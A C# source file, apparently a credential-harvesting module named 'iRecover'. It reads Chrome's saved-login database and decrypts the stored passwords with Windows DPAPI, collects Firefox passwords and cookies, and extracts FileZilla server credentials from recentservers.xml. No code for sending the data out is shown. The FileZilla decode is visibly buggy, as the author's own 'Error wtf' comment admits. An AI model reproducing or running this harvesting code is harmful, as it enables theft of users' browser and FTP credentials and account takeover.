using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Data;
using System.IO;
using System.Security.Cryptography;

namespace iRecover
{
    public static class Browsers
    {
        public static List<FirefoxPassword> FireFoxPassword()
        {
            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
            return firefoxPasswords;
        }

        public static List<FirefoxCookie> FireFoxCookies()
        {
            List<FirefoxCookie> firefoxCookies = Firefox.Cookies();
            return firefoxCookies;
        }

        public static List<string> ChromePassword()
        {
            List<string> passes = new List<string>();
            var dataPath = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data\Default\Login Data";
            var sqliteConnection = new SQLiteConnection("Data Source=" + dataPath + ";Version=3;New=True;Compress=True;");
            var sqliteCommand = sqliteConnection.CreateCommand();

            sqliteCommand.CommandText = "select Origin_URL, Username_value, Password_value from logins";
            sqliteConnection.Open();
            var sqliteDatareader = sqliteCommand.ExecuteReader();

            while (sqliteDatareader.Read())
            {
                string url = (string)sqliteDatareader["Origin_URL"];
                string usr = (string)sqliteDatareader["Username_value"];
                byte[] pwd = (byte[])sqliteDatareader["Password_value"];
                byte[] decrypted = ProtectedData.Unprotect(pwd, null, DataProtectionScope.CurrentUser);
                if (decrypted.Length > 0)
                    passes.Add(url + " :: "+usr  +":" + Encoding.Default.GetString(decrypted));
            }
            sqliteConnection.Close();
            return passes;
        }
    }

    public static class Tools
    {
        public static List<string> FileZilla()
        {
            List<string> hosts = new List<string>();
            string DocumentoXml = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\Filezilla\\recentservers.xml";
            int counter = File.ReadAllText(DocumentoXml).Split(new string[] { "<Server>" }, StringSplitOptions.None).Length - 1;
            string StrHost;
            string StrPort;
            string StrUser;
            string StrPass;
            DataSet Ds = new DataSet();
            Ds.ReadXml(DocumentoXml);
            for (int i = 0; i < counter; i++)
            {
                StrHost = Ds.Tables["Server"].Rows[i]["Host"].ToString();
                StrPort = Ds.Tables["Server"].Rows[i]["Port"].ToString();
                StrUser = Ds.Tables["Server"].Rows[i]["User"].ToString();
                StrPass = Convert.FromBase64String(Ds.Tables["Server"].Rows[i]["Pass"].ToString()).ToString(); //Error wtf
                hosts.Add("Host: " + StrHost + "\nPort: " + StrPort + "\nUser: " + StrUser + "\nPassword: " + StrPass + "\n\n");
            }
            return hosts;
        }
    }
}

